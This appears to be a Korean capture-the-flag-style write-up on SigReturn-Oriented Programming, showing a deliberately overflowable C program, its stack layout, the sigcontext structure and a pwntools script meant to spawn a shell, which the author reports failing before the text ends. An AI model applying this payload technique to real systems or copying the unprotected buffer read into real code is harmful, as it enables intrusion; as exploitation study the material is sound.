# Exploit Tech: SigReturn-Oriented Programming

**srop.c**

```c
// Name: srop.c
// Compile: gcc -o srop srop.c -fno-stack-protector -no-pie

#include <unistd.h>

int gadget() {
  asm("pop %rax;"
      "syscall;"
      "ret" );
}

int main()
{
  char buf[16];
  read(0, buf ,1024);
}
```

```bash
pwndbg> checksec
File:     /home/alex030905/pwnable/SROP/srop/srop
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

도커파일도 없고 srop.c 랑 실행파일 두개만 받았다.  
코드도 간단하니 바로 방향잡고 익스플로잇 코드를 작성해보자.   
<br>

**코드 분석**

buf 를 입력 받을 때 오버플로우가 일어나고 int gadget 함수가 시스템 콜을 실행하는 함수이니 rax에 15를 넣어서 sigreturn 을 실행하고 sigcontext 에 쉘을 실행하게 인자를 넣어버리자   
우선 sigcontext 구조를 이렇게 기억해둔다.  


```bash
/* __x86_64__: */
struct sigcontext {
  __u64               r8;
  __u64               r9;
  __u64               r10;
  __u64               r11;
  __u64               r12;
  __u64               r13;
  __u64               r14;
  __u64               r15;
  __u64               rdi;
  __u64               rsi;
  __u64               rbp;
  __u64               rbx;
  __u64               rdx;
  __u64               rax;
  __u64               rcx;
  __u64               rsp;
  __u64               rip;
  __u64               eflags;     /* RFLAGS */
  __u16               cs;
  __u16               gs;
  __u16               fs;
  union {
      __u16           ss; /* If UC_SIGCONTEXT_SS */
      __u16           __pad0; /* Alias name for old (!UC_SIGCONTEXT_SS) user-space */
  };
  __u64               err;
  __u64               trapno;
  __u64               oldmask;
  __u64               cr2;
  struct _fpstate __user      *fpstate;   /* Zero when no FPU context */
#  ifdef __ILP32__
  __u32               __fpstate_pad;
#  endif
  __u64               reserved1[8];
};
```

<br>

<img width="1433" height="912" alt="image" src="https://github.com/user-attachments/assets/4fad91bb-79be-402a-9148-0cc474095b36" />

자 이건 A를 대충 입력했을 때 스택 구조이다.   
바로 구조를 짜보면,  

| 오프셋 | 항목 | 값 |
| --- | --- | --- |
| 0x00 | 더미 24바이트 | A * 24 |
| 0x18 | 리턴주소 | int gadget() |
| 0x20 | rax (sigreturn용) | 15 |
| 0x28 | r8 | 0 |
| 0x30 | r9 | 0 |
| 0x38 | r10 | 0 |
| 0x40 | r11 | 0 |
| 0x48 | r12 | 0 |
| 0x50 | r13 | 0 |
| 0x58 | r14 | 0 |
| 0x60 | r15 | 0 |
| 0x68 | rdi | “/bin/sh” 문자열 주소 |
| 0x70 | rsi | 0 |
| 0x78 | rbp | 0 |
| 0x80 | rbx | 0 |
| 0x88 | rdx | 0 |
| 0x90 | rax (실제 syscall용) | 59 |
| 0x98 | rcx | 0 |
| 0xa0 | rsp | 0 |
| 0xa8 | rip | int gadget() |

이거라 생각하고 익스플로잇 코드를 짜서 보내봤는데 실패했다.  

<br>

**실패 익스플로잇 코드**

```python
from pwn import *

p = process('./srop')
e = ELF('./srop')

binsh = 0x7ffff7dcb42f
gadget_addr = e.symbols['gadget']

print('gadget addr : ', hex(gadget_addr))

payload = b'A' * 24
payload += p64(gadget_addr)
payload += p64(15)

# r8~r15
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)

# rdi
payload += p64(binsh) 

# rsi ~ rdx
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)

# rax
payload += p64(59)

# rcx, rsp
payload += p64(0)
payload += p64(0)

# rip
payload += p64(gadget_addr)

p.send(payload)
p.interactive()
```

  
<img width="1427" height="576" alt="image" src="https://github.com/user-attachments/assets/1038978b-d58a-4264-a6d5-e692f55c6661" />

실패했다.  

덤프코어 파일을 받아서 왜 안됐는지 분석해보자.  
